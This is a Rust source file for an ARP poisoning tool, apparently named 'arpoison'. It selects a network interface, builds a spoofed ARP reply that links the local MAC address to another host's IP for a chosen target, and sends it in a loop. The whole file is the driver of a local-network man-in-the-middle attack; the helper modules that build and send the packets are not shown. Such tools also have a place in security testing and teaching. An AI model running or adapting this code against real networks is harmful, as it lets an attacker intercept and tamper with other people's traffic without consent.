// File: main.rs

extern crate clap;
extern crate pnet;

use pnet::datalink;
use std::process::exit;
use std::thread;

mod args;
mod link;

fn main() {
	// Get the command line arguments
	let app_args = args::get_args();

    // Closure to be used as a filter
	let iface_match = |iface: &datalink::NetworkInterface| {
        iface.name == app_args.interface
    };
    let interfaces = datalink::interfaces();
	let iface = match interfaces.into_iter()
						        .filter(iface_match)
                                .next() {
		Some(i) => i,
		None => {
			eprintln!(
                "Could not find interface: {}, exiting.", 
                app_args.interface
            );
			exit(1);
		},
	};

	println!(
		"Using interface: {} ({})", 
		iface.name, 
		iface.mac.unwrap(),
	);

    let poison_packet = link::ArpoisonReply::new(
        app_args.host,
        iface.mac.unwrap(),
        app_args.target,
        app_args.t_mac,
    );

    if app_args.bidirect {
        println!(
            "You have specified bidirectional operation, but this feature is not implemented. \
            If you want to poison in two directions, run two instances of arpoison ;P"
        );
    }

    let worker_one = thread::spawn(move || { 
        link::send_arp_loop(&iface, &poison_packet) 
    });

    match worker_one.join() {
        Ok(_) => {},
        Err(e) => {
            eprintln!("There was a problem joining the child thread(s) ({:?})", e)
        }
    }
}
